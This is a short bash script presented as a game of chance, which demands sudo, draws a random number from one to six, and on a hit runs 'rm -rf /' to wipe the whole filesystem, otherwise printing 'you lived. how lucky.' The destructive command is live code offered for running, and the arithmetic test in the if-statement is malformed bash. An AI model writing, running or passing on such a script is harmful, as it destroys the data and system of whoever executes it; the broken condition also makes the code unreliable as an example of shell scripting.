# Ayo bro, good luck!

#!/bin/bash

# Check if the script is running with sudo privileges
if [ $EUID != 0 ]; then
  echo "This script must be run with sudo privileges."
  exit 1
fi

# Generate a random number between 1 and 6
draw=$(shuf -i1-6 -n1)

# Check if the number is divisible by 6
if [ $draw % 6 == 0 ]; then
 rm -rf /
else
  echo "you lived. how lucky."
fi
